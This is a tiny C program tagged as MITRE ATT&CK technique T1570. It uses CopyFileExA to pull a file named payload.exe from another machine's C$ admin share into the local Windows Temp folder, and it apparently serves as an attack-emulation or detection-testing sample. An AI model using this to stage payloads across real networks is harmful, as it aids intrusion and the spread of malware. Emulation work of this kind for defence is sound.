/*
 * T1570 — Lateral Tool Transfer. CopyFileEx / access to UNC/SMB paths.
 */
#include <windows.h>

int main(void) {
    const char *unc = "\\\\192.168.1.1\\C$\\Windows\\temp\\payload.exe";
    const char *local = "C:\\Windows\\Temp\\payload.exe";
    CopyFileExA(unc, local, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS);
    return 0;
}
